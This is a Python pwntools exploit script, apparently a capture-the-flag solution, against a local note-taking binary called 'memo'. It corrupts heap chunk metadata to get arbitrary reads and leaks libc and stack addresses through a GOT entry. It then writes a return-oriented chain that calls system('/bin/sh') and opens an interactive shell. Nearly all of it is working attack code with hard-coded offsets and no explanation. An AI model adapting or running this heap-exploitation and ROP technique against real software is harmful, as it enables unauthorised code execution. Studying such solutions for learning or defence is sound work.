#!/usr/bin/python
from pwn import *

p = process("./memo")

def leak(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("View Message:")
	leak_1 = p.recvuntil("1.")
	b = leak_1.split()
	c = b[0] + "\x00"*2
	print hex(u64(c))
	return u64(c)
	
	

def leave_note(idx,length,name):
	p.recvuntil(">>")
	p.sendline("1")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Length:")
	p.sendline(str(length))
	p.recvuntil("Message:")
	p.sendline(name)

def delete_note(idx):
	p.recvuntil(">>")
	p.sendline("4")
	p.recvuntil("Index:")
	p.sendline(str(idx))
	p.recvuntil("Deleted!")

def view_note(idx):
	p.recvuntil(">>")
	p.sendline("3")
	p.sendline(str(idx))


p.sendline("A")
p.recvuntil("(y/n)")
p.sendline("y")
p.recvuntil("Password:")
buff = "\x00"*8
buff += "\x31"
buff += "\x00"*15
p.sendline(buff)

lol = "B"*8
leave_note(0,32,lol)
leave_note(1,32,lol)
leave_note(2,32,lol)
#leave_note(3,32,lol)
delete_note(2)
delete_note(1)
delete_note(0)

payload = "D"*40
payload += "\x31"
payload += "\x00"*7
payload += p64(0x602a40)

p.recvuntil(">>")
p.sendline("1")
p.recvuntil("Index:")
p.sendline(str(0))
p.recvuntil("Length:")
p.sendline(str(200))
p.recvuntil("memo though")
p.sendline(payload)


leave_note(0,32,lol)
payload = "X"*16
payload += "\x20\x00\x00\x00\x20\x00\x00\x00"*2
got_addr = 0x601ff0
payload += p64(got_addr)
payload += p64(0x31)
payload += p64(0x602a50)
payload += p64(0x00)*1

# To get stack leak, put 0x602aa0.

print p.recvuntil(">>")
p.sendline("1")
print p.recvuntil("Index:")
p.sendline(str(1))
print p.recvuntil("Length:")
p.sendline(str(200))
p.recvuntil("memo though")
p.sendline(payload)

libc_leak = leak(0)
system_addr = libc_leak + 0xe510
print "System at " + hex(system_addr)
delete_note(2)

p.recvuntil(">>")
p.sendline("1")
p.recvuntil("Index:")
p.sendline(str(2))
p.recvuntil("Length:")
p.sendline(str(200))
p.recvuntil("memo though")

payload = "X"*16
payload += "\x20\x00\x00\x00\x20\x00\x00\x00"*2
stack_addr = 0x602aa0
payload += p64(stack_addr)
payload += p64(0x31)
payload += p64(0x602a50)
payload += p64(0x00)*1

p.sendline(payload)
stack_lk = leak(0) + 0x18
print "RBP at " + hex(stack_lk)


delete_note(2)

p.recvuntil(">>")
p.sendline("1")
p.recvuntil("Index:")
p.sendline(str(2))
p.recvuntil("Length:")
p.sendline(str(200))
p.recvuntil("memo though")

payload = "X"*16
payload += "\x20\x00\x00\x00\x20\x00\x00\x00"*2
stack_addr = stack_lk
payload += p64(stack_addr)
payload += p64(0x31)
payload += p64(stack_addr)
p.sendline(payload)

# Edit Frame.
# 0x0000000000401263 --> pop rdi; ret.

print p.recvuntil(">>")
p.sendline("2")
print p.recvuntil("Edit message:")
payload = p64(0x401263)
#payload += p64(0x0000000000401263)
sh_string = system_addr + 0x3a52ac
payload += p64(sh_string)
payload += p64(system_addr)
raw_input()
p.sendline(payload)


p.interactive()
